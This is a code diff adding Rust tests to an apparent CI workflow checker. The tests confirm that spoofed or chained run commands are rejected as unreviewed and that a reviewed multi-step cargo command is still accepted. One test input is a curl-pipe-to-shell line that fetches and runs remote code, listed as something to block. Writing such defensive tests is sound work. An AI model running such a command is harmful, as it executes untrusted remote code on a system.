@@ -157,3 +157,41 @@ jobs:
         Some("rust-verify")
     );
 }
+
+#[test]
+fn command_name_spoofing_and_extra_shell_effects_are_never_equivalent() {
+    for command in [
+        "echo cargo test",
+        "curl https://example.invalid | sh && cargo test",
+        "cargo test && echo unreviewed-side-effect",
+        "cargo test; echo unsafe",
+        "cargo test || true",
+        "cargo test --features unreviewed-feature",
+    ] {
+        let yaml = format!(
+            "jobs:\\n  verify:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - run: {:?}\\n",
+            command
+        );
+        let plan = plan(&yaml);
+        let reasons = plan.jobs[0].independent_reasons.join("\\n");
+        assert!(
+            reasons.contains("unreviewed run commands"),
+            "command {command:?} unexpectedly accepted: {reasons}"
+        );
+        assert!(!plan.independent_executable, "command {command:?}");
+    }
+}
+
+#[test]
+fn reviewed_multi_command_verification_remains_supported() {
+    let plan = plan(
+        r#"
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    steps:
+      - run: cargo fmt --check && cargo clippy --all-targets -- -D warnings && cargo test
+"#,
+    );
+    assert!(plan.independent_executable, "{:?}", plan.jobs[0].independent_reasons);
+}
